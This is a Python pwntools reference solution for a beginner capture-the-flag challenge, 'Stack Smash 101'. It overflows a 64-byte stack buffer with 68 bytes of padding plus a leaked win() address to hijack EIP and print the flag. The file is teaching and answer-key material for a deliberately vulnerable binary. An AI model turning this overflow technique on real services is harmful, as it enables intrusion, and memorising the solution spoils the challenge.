#!/usr/bin/env python3
"""
scripts/solve_pwn_bof.py  —  Reference exploit for Stack Smash 101

This is the SOLUTION script. Do NOT include this in challenge files.
Keep it for your own reference / admin testing.

Requirements:
    pip install pwntools

Usage:
    # Against local Docker container:
    python scripts/solve_pwn_bof.py

    # Against remote (update HOST/PORT):
    REMOTE=1 python scripts/solve_pwn_bof.py
"""

from pwn import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "4444"))
REMOTE = os.getenv("REMOTE", "")

context.arch = "i386"
context.log_level = "info"


def exploit():
    if REMOTE:
        io = remote(HOST, PORT)
    else:
        io = remote(HOST, PORT)

    # Read banner and extract win() address (PIE is disabled but address is printed anyway)
    io.recvuntil(b"win()  is at: ")
    win_addr = int(io.recvline().strip(), 16)
    log.success(f"win() @ {hex(win_addr)}")

    io.recvuntil(b"Enter your name: ")

    # Layout (32-bit):
    #   [64 bytes buffer][4 bytes saved EBP][4 bytes saved EIP] <-- overwrite this
    #
    # Offset to EIP = 64 + 4 = 68 bytes of padding
    offset  = 68
    payload = b"A" * offset + p32(win_addr)

    log.info(f"Sending payload ({len(payload)} bytes)")
    io.sendline(payload)

    # Read the flag
    output = io.recvall(timeout=3).decode(errors="replace")
    log.success(f"Output:\n{output}")

    if "CTF{" in output:
        flag = output[output.index("CTF{"):output.index("}") + 1]
        log.success(f"FLAG: {flag}")
    else:
        log.warning("Flag not found in output")

    io.close()


if __name__ == "__main__":
    exploit()
